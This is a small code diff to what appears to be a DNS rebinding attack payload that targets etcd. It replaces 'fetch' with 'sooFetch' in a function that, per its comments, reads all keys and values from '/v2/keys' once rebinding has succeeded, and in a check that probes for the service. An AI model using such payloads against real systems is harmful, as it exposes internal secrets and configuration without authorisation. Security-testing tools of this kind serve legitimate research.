@@ -9,7 +9,7 @@ const Etcd = () => {
     // Invoked after DNS rebinding has been performed
     function attack(headers, cookie, body) {
         /* /v2/keys/ : Send a GET request to get the list of keys and values */
-        fetch('/v2/keys', {})
+        sooFetch('/v2/keys', {})
             .then(responseOKOrFail("Could not submit a request to get a list of keys"))
             .then(function (d) { // we successfully received data (the key/value pairs)
                 console.log(`raw json:  ${d}`);
@@ -28,7 +28,7 @@ const Etcd = () => {
     // Invoked to determine whether the rebinded service
     // is the one targeted by this payload. Must return true or false.
     async function isService(headers, cookie, body) {
-        return fetch("/v2/keys",{
+        return sooFetch("/v2/keys",{
             mode: 'no-cors',
             credentials: 'omit',
         })
